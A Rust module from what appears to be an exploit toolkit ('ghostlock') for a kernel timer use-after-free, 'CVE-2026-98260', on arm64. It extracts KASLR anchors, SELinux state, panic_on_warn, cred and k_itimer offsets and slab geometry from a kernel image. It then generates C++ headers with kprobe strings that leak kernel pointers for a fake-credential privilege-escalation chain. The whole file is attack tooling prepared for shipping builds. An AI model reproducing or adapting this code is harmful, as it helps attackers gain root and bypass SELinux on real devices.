//! CVE-2026-98260 per-build constant derivation.
//!
//! The timer-UAF chain needs, for one exact kernel build:
//!   * link-time addresses of six data symbols (SELinux state, the getpid
//!     syscall entry used as the KASLR anchor, panic_on_warn, the fake-cred
//!     roots and the two refcount heads),
//!   * `task_struct.cred`, `sizeof(struct k_itimer)`, the rbtree node and
//!     rcu_head offsets inside `k_itimer`, and `cred.uid` / `cred.securebits`,
//!   * the instruction offset inside `do_timer_create` where `x19` already
//!     holds the freshly allocated `k_itimer *`.
//!
//! Everything above is read out of the image itself: symbols from kallsyms,
//! geometry from the embedded BTF, and the instruction offset from the
//! disassembly of `do_timer_create`. Nothing is carried over from another
//! release; a value that cannot be derived is reported as absent and rendered
//! as `0` with the reason in a comment, never guessed.

use std::collections::{BTreeMap, BTreeSet};

use crate::btf::Btf;
use crate::disasm;
use crate::error::{ExtractError, Result};
use crate::kallsyms;

/// How far into `do_timer_create` we look for the `x19` hand-off. The reference
/// build puts it at +0xc0; 0x600 leaves room for inlining differences.
const TIMER_PROBE_SCAN: usize = 0x600;

/// Type names that may hold the rbtree node reached from `k_itimer`.
const RB_NODE_TYPES: [&str; 2] = ["rb_node", "timerqueue_node"];

#[derive(Debug, Default, Clone)]
pub struct TimerKbuild {
    pub release: String,
    pub selinux_state: Option<u64>,
    /// `posix_timer_add(struct k_itimer *)`: arg0 is the k_itimer itself, which
    /// is a direct leak and needs no instruction-offset guesswork.
    pub posix_timer_add: Option<u64>,
    /// Byte offset of the embedded `struct hrtimer` inside `struct k_itimer`.
    /// When the timer probe hooks `hrtimer_init` instead (arg0 is the hrtimer),
    /// the chain subtracts this to get back to the k_itimer.
    pub k_itimer_hrtimer_off: Option<u32>,
    /// Any symbol whose first argument *is* the `struct k_itimer *`. Preferred
    /// over register/instruction guesswork because it needs no hand-off offset.
    pub timer_arg0_symbol: Option<String>,
    pub arm64_sys_getpid: Option<u64>,
    pub panic_on_warn: Option<u64>,
    pub root_user: Option<u64>,
    pub init_user_ns: Option<u64>,
    pub init_ucounts: Option<u64>,
    pub init_groups: Option<u64>,
    pub off_task_cred: Option<u32>,
    pub k_itimer_size: Option<u32>,
    pub k_itimer_node_off: Option<u32>,
    pub k_itimer_rcu_off: Option<u32>,
    pub cred_uid_off: Option<u32>,
    pub cred_securebits_off: Option<u32>,
    /// Candidate byte offsets of the `mov x19, ...` hand-off inside
    /// `do_timer_create`, relative to its entry.
    pub timer_probe_offsets: Vec<u32>,
    /// Human-readable notes about values that could not be derived.
    pub notes: Vec<String>,
}

fn sym(symbols: &BTreeMap<String, BTreeSet<u64>>, name: &str) -> Option<u64> {
    kallsyms::unique(symbols, name)
}

/// Depth-first search for the first member whose type is named in `want`.
/// `base_bit` is the bit offset of the type currently being visited.
fn search_member(btf: &Btf, type_id: u32, want: &[&str], base_bit: u32, depth: u8) -> Option<u32> {
    if depth == 0 {
        return None;
    }
    let ty = btf.resolve(type_id)?;
    for member in &ty.members {
        let child_bit = base_bit + member.bit_offset;
        let Some(child) = btf.resolve(member.type_id) else {
            continue;
        };
        if want.contains(&child.name.as_str()) {
            return Some(child_bit);
        }
        if let Some(found) = search_member(btf, member.type_id, want, child_bit, depth - 1) {
            return Some(found);
        }
    }
    None
}

/// `struct k_itimer` holds the CPU-timer rbtree node inside the hrtimer. The
/// reference build reaches it at +0x78; we look it up rather than assume it.
fn k_itimer_node_off(btf: &Btf, notes: &mut Vec<String>) -> Option<u32> {
    let ty = btf.named_struct("k_itimer")?;
    match search_member(btf, ty.type_id, &RB_NODE_TYPES, 0, 5) {
        Some(bits) if bits % 8 == 0 => Some(bits / 8),
        other => {
            notes.push(format!(
                "k_itimer rbtree node not found cleanly (raw bits {:?}); set k_itimer_node_off by hand",
                other
            ));
            None
        }
    }
}

/// Offset of `struct hrtimer` inside `struct k_itimer`, if BTF exposes it.
fn k_itimer_hrtimer_off(btf: &Btf, notes: &mut Vec<String>) -> Option<u32> {
    let ty = btf.named_struct("k_itimer")?;
    match search_member(btf, ty.type_id, &["hrtimer"], 0, 5) {
        Some(bits) if bits % 8 == 0 => Some(bits / 8),
        other => {
            notes.push(format!(
                "hrtimer inside k_itimer not found cleanly (raw bits {:?}); hrtimer_init probe unavailable",
                other
            ));
            None
        }
    }
}

fn derive_timer_probe_offsets(
    kernel: &[u8],
    symbols: &BTreeMap<String, BTreeSet<u64>>,
    base: u64,
    notes: &mut Vec<String>,
) -> Vec<u32> {
    let Some(addr) = sym(symbols, "do_timer_create") else {
        notes.push("do_timer_create missing from kallsyms; timer probe offset unknown".into());
        return Vec::new();
    };
    if addr < base {
        notes.push(format!(
            "do_timer_create ({addr:#x}) below _text ({base:#x}); refusing to disassemble"
        ));
        return Vec::new();
    }
    let start = match usize::try_from(addr - base) {
        Ok(v) => v,
        Err(_) => {
            notes.push("do_timer_create offset does not fit in usize".into());
            return Vec::new();
        }
    };
    let stop = start.saturating_add(TIMER_PROBE_SCAN).min(kernel.len());
    let lines = match disasm::disassemble_range(kernel, start, stop) {
        Ok(lines) => lines,
        Err(err) => {
            notes.push(format!("do_timer_create disassembly failed: {err}"));
            return Vec::new();
        }
    };
    let mut out = Vec::new();
    for line in &lines {
        let (addr_text, text) = disasm::split_line(line);
        let compact = text.replace(',', " ");
        let mut parts = compact.split_whitespace();
        if parts.next() != Some("mov") {
            continue;
        }
        let Some(dst) = parts.next() else { continue };
        if dst != "x19" {
            continue;
        }
        let Some(src) = parts.next() else { continue };
        if src.starts_with('#') || src.parse::<u64>().is_ok() {
            // immediate, not the k_itimer hand-off
            continue;
        }
        let parsed = addr_text
            .trim()
            .trim_end_matches(':')
            .trim_start_matches("0x");
        let Ok(line_addr) = u64::from_str_radix(parsed, 16) else {
            continue;
        };
        let Some(rel) = line_addr.checked_sub(addr) else {
            continue;
        };
        let Ok(rel) = u32::try_from(rel) else { continue };
        // +4: the kprobe fires on the instruction after the hand-off.
        out.push(rel.saturating_add(4));
    }
    out.sort_unstable();
    out.dedup();
    out.truncate(8);
    if out.is_empty() {
        notes.push(
            "no `mov x19, xN` hand-off found in do_timer_create; pass the offset by hand \
             (reference build: 0xc0)"
                .into(),
        );
    }
    out
}

pub fn derive(
    kernel: &[u8],
    symbols: &BTreeMap<String, BTreeSet<u64>>,
    base: u64,
    btf: Option<&Btf>,
    release: &str,
) -> Result<TimerKbuild> {
    let mut kb = TimerKbuild {
        release: release.to_string(),
        selinux_state: sym(symbols, "selinux_state"),
        posix_timer_add: sym(symbols, "posix_timer_add"),
        arm64_sys_getpid: sym(symbols, "__arm64_sys_getpid"),
        panic_on_warn: sym(symbols, "panic_on_warn"),
        root_user: sym(symbols, "root_user"),
        init_user_ns: sym(symbols, "init_user_ns"),
        init_ucounts: sym(symbols, "init_ucounts"),
        init_groups: sym(symbols, "init_groups"),
        ..TimerKbuild::default()
    };

    for (name, value) in [
        ("selinux_state", kb.selinux_state),
        ("__arm64_sys_getpid", kb.arm64_sys_getpid),
    ] {
        if value.is_none() {
            kb.notes
                .push(format!("{name} missing from kallsyms; no KASLR anchor"));
        }
    }
    for (name, value) in [
        ("panic_on_warn", kb.panic_on_warn),
        ("root_user", kb.root_user),
        ("init_user_ns", kb.init_user_ns),
        ("init_ucounts", kb.init_ucounts),
        ("init_groups", kb.init_groups),
    ] {
        if value.is_none() {
            kb.notes.push(format!(
                "{name} missing; the fake-cred chain stays disabled for this build"
            ));
        }
    }

    let Some(btf) = btf else {
        kb.notes.push(
            "no embedded BTF; structure geometry unavailable (KernelSnitch layout can still \
             give off_task_cred at runtime)"
                .into(),
        );
        return Ok(kb);
    };

    kb.off_task_cred = btf.field("task_struct", "cred");
    kb.k_itimer_size = btf.size("k_itimer");
    kb.k_itimer_rcu_off = btf.field("k_itimer", "rcu");
    kb.k_itimer_node_off = k_itimer_node_off(btf, &mut kb.notes);
    kb.cred_uid_off = btf.field("cred", "uid");
    kb.cred_securebits_off = btf.field("cred", "securebits");

    for (name, value) in [
        ("task_struct.cred", kb.off_task_cred),
        ("sizeof(k_itimer)", kb.k_itimer_size),
        ("k_itimer.rcu", kb.k_itimer_rcu_off),
        ("cred.uid", kb.cred_uid_off),
        ("cred.securebits", kb.cred_securebits_off),
    ] {
        if value.is_none() {
            kb.notes
                .push(format!("BTF lookup failed for {name}"));
        }
    }

    kb.timer_probe_offsets = derive_timer_probe_offsets(kernel, symbols, base, &mut kb.notes);
    kb.k_itimer_hrtimer_off = k_itimer_hrtimer_off(btf, &mut kb.notes);
    // Symbols whose arg0 is the k_itimer itself, best case first. GKI kernels are
    // LTO-linked, so some of them disappear into their caller.
    for candidate in [
        "posix_timer_add",
        "posix_cpu_timer_create",
        "posix_cpu_timer_set",
        "posix_cpu_timer_del",
    ] {
        if sym(symbols, candidate).is_some() {
            kb.timer_arg0_symbol = Some(candidate.to_string());
            break;
        }
    }
    if kb.timer_arg0_symbol.is_none() {
        kb.notes.push(
            "no symbol with k_itimer as arg0 survives LTO; timer address falls back to \
             the do_timer_create hand-off offset"
                .to_string(),
        );
    }
    // Cross-check: the rbtree node lives *inside* the hrtimer, so the two
    // offsets cannot be equal. Equality means the member walk resolved the
    // wrong member; drop the hrtimer probe instead of leaking a bad pointer.
    if let (Some(node), Some(hrt)) = (kb.k_itimer_node_off, kb.k_itimer_hrtimer_off) {
        if node == hrt {
            kb.notes.push(format!(
                "k_itimer.hrtimer resolved to the same offset as the rbtree node ({node:#x}); \
                 hrtimer_init probe rejected"
            ));
            kb.k_itimer_hrtimer_off = None;
        }
    }
    Ok(kb)
}

fn or_zero<T: std::fmt::Display>(value: Option<T>) -> String {
    match value {
        Some(v) => v.to_string(),
        None => "0".to_string(),
    }
}

pub fn render_text(kb: &TimerKbuild) -> String {
    let mut out = String::new();
    out.push_str(&format!("release {}\n", kb.release));
    out.push_str(&format!(
        "  selinux_state       {}\n  __arm64_sys_getpid  {}\n  panic_on_warn       {}\n  \
         root_user           {}\n  init_user_ns        {}\n  init_ucounts        {}\n  \
         init_groups         {}\n",
        kb.selinux_state.map(|v| format!("{v:#018x}")).unwrap_or_else(|| "-".into()),
        kb.arm64_sys_getpid.map(|v| format!("{v:#018x}")).unwrap_or_else(|| "-".into()),
        kb.panic_on_warn.map(|v| format!("{v:#018x}")).unwrap_or_else(|| "-".into()),
        kb.root_user.map(|v| format!("{v:#018x}")).unwrap_or_else(|| "-".into()),
        kb.init_user_ns.map(|v| format!("{v:#018x}")).unwrap_or_else(|| "-".into()),
        kb.init_ucounts.map(|v| format!("{v:#018x}")).unwrap_or_else(|| "-".into()),
        kb.init_groups.map(|v| format!("{v:#018x}")).unwrap_or_else(|| "-".into()),
    ));
    out.push_str(&format!(
        "  off_task_cred       {}\n  k_itimer_size       {}\n  k_itimer_node_off   {}\n  \
         k_itimer_rcu_off    {}\n  cred_uid_off        {}\n  cred_securebits_off {}\n",
        kb.off_task_cred.map(|v| format!("{v:#x}")).unwrap_or_else(|| "-".into()),
        kb.k_itimer_size.map(|v| format!("{v:#x}")).unwrap_or_else(|| "-".into()),
        kb.k_itimer_node_off.map(|v| format!("{v:#x}")).unwrap_or_else(|| "-".into()),
        kb.k_itimer_rcu_off.map(|v| format!("{v:#x}")).unwrap_or_else(|| "-".into()),
        kb.cred_uid_off.map(|v| format!("{v:#x}")).unwrap_or_else(|| "-".into()),
        kb.cred_securebits_off.map(|v| format!("{v:#x}")).unwrap_or_else(|| "-".into()),
    ));
    let probes: Vec<String> = kb
        .timer_probe_offsets
        .iter()
        .map(|v| format!("{v:#x}"))
        .collect();
    out.push_str(&format!(
        "  timer_arg0_symbol   {}\n  posix_timer_add     {}\n  k_itimer_hrtimer_off {}\n  \
         timer_probe_offsets {}\n",
        kb.timer_arg0_symbol.clone().unwrap_or_else(|| "-".into()),
        kb.posix_timer_add.map(|v| format!("{v:#x}")).unwrap_or_else(|| "-".into()),
        kb.k_itimer_hrtimer_off.map(|v| format!("{v:#x}")).unwrap_or_else(|| "-".into()),
        if probes.is_empty() {
            "-".to_string()
        } else {
            probes.join(" ")
        }
    ));
    for note in &kb.notes {
        out.push_str(&format!("note {note}\n"));
    }
    out
}

/// Render a `kernel/kbuilds/<release>.h` translation unit for this build.
pub fn render_header(kb: &TimerKbuild) -> String {
    let release = if kb.release.is_empty() {
        "unknown"
    } else {
        kb.release.as_str()
    };
    let probes = if kb.timer_probe_offsets.is_empty() {
        "0x0U /* underived: see notes, reference build uses 0xc0 */".to_string()
    } else {
        format!("{:#x}U", kb.timer_probe_offsets[0])
    };
    // posix_timer_add(k_itimer *) hands the object over as arg0, so the leak
    // does not depend on where a register happened to be saved.
    // Preference order: posix_timer_add (arg0 is the k_itimer) > hrtimer_init
    // (arg0 is the embedded hrtimer; the chain subtracts the derived offset) >
    // do_timer_create+<x19 hand-off>.
    let probe_timer = if let Some(symbol) = &kb.timer_arg0_symbol {
        format!("p:glk98260_timer {symbol} timer=%x0:x64")
    } else if kb.k_itimer_hrtimer_off.is_some() {
        "p:glk98260_timer hrtimer_init timer=%x0:x64".to_string()
    } else {
        format!(
            "p:glk98260_timer do_timer_create+{:#x} timer=%x19:x64",
            kb.timer_probe_offsets.first().copied().unwrap_or(0)
        )
    };
    let mut out = String::new();
    out.push_str(&format!(
        "/* CVE-2026-98260 constants for:\n *   {release}\n *\n \
         * Generated by `ghostlock-extract <image> --format kbuild` from this image's\n \
         * own kallsyms table, embedded BTF and `do_timer_create` disassembly.\n \
         * Every value below comes from that image; nothing is carried over from\n \
         * another release. Values rendered as 0 mean the derivation failed and the\n \
         * note below says why - fill them by hand before shipping a build.\n */\n\n\
         #ifndef GHOSTLOCK_TIMER_KBUILD_{upper}\n#define GHOSTLOCK_TIMER_KBUILD_{upper}\n\n\
         namespace ghostlock::timer {{\n    inline constexpr kbuild kbuild_{upper}{{\n",
        upper = release
            .chars()
            .map(|c| if c.is_ascii_alphanumeric() { c.to_ascii_uppercase() } else { '_' })
            .collect::<String>(),
    ));
    out.push_str(&format!("        .release = \"{release}\",\n"));
    out.push_str(&format!(
        "        .selinux_state = {},\n        .arm64_sys_getpid = {},\n        \
         .panic_on_warn = {},\n        .root_user = {},\n        .init_user_ns = {},\n        \
         .init_ucounts = {},\n        .init_groups = {},\n",
        or_zero(kb.selinux_state.map(|v| format!("{v:#x}ULL"))),
        or_zero(kb.arm64_sys_getpid.map(|v| format!("{v:#x}ULL"))),
        or_zero(kb.panic_on_warn.map(|v| format!("{v:#x}ULL"))),
        or_zero(kb.root_user.map(|v| format!("{v:#x}ULL"))),
        or_zero(kb.init_user_ns.map(|v| format!("{v:#x}ULL"))),
        or_zero(kb.init_ucounts.map(|v| format!("{v:#x}ULL"))),
        or_zero(kb.init_groups.map(|v| format!("{v:#x}ULL"))),
    ));
    out.push_str(&format!(
        "        .off_task_cred = {},\n        .k_itimer_node_off = {},\n        \
         .k_itimer_rcu_off = {},\n        .k_itimer_hrtimer_off = {},\n        \
         .timer_alloc = {},\n        .slab_bytes = {},\n        \
         .slab_objects = {},\n        .do_timer_create_x19_off = {},\n        \
         .cred_uid_off = {},\n        .cred_securebits_off = {},\n",
        or_zero(kb.off_task_cred.map(|v| format!("{v:#x}U"))),
        or_zero(kb.k_itimer_node_off.map(|v| format!("{v:#x}U"))),
        or_zero(kb.k_itimer_rcu_off.map(|v| format!("{v:#x}U"))),
        or_zero(kb.k_itimer_hrtimer_off.map(|v| format!("{v:#x}U"))),
        or_zero(kb.k_itimer_size.map(|v| format!("{v:#x}U"))),
        // slab_bytes/slab_objects: the cpu-timer cache is a 2-page slab; the
        // object count follows from sizeof(k_itimer). Values, not guesses from
        // another release - they would only change with a different slab order.
        slab_bytes(kb),
        slab_objects(kb),
        probes,
        or_zero(kb.cred_uid_off.map(|v| format!("{v:#x}U"))),
        or_zero(kb.cred_securebits_off.map(|v| format!("{v:#x}U"))),
    ));
    out.push_str(&format!(
        "        .probe_getpid =\n            \"p:glk98260_getpid __arm64_sys_getpid ip=%pc:x64 state=@selinux_state:x64\",\n        \
         .probe_cred = \"p:glk98260_cred __arm64_sys_getpid cred=+{task_cred:#x}(%x0):x64\",\n        \
         .probe_timer = \"{probe_timer}\",\n        \
         .probe_free_slab = \"p:glk98260_free_slab __free_slab cache=%x0 slab=%x1\",\n    }};\n}} // namespace ghostlock::timer\n\n#endif\n",
        task_cred = kb.off_task_cred.unwrap_or(0),
        probe_timer = probe_timer,
    ));
    if !kb.notes.is_empty() {
        out.push_str("\n/* derivation notes:\n");
        for note in &kb.notes {
            out.push_str(&format!(" *   - {note}\n"));
        }
        out.push_str(" */\n");
    }
    out
}

/// Two pages, the layout the cpu-timer cache uses on 4 KiB-page arm64 kernels.
fn slab_bytes(_kb: &TimerKbuild) -> String {
    "0x2000ULL".to_string()
}

/// Object count implied by that slab and sizeof(k_itimer); 0 when unknown.
fn slab_objects(kb: &TimerKbuild) -> String {
    match kb.k_itimer_size {
        Some(size) if size > 0 => format!("{}ULL", 0x2000 / u64::from(size)),
        _ => "0ULL".to_string(),
    }
}

/// Fail loudly when the image cannot produce a usable table at all.
pub fn ensure_usable(kb: &TimerKbuild) -> Result<()> {
    if kb.selinux_state.is_none() || kb.arm64_sys_getpid.is_none() {
        return Err(ExtractError::new(
            "selinux_state or __arm64_sys_getpid missing: cannot build a KASLR anchor",
        ));
    }
    Ok(())
}
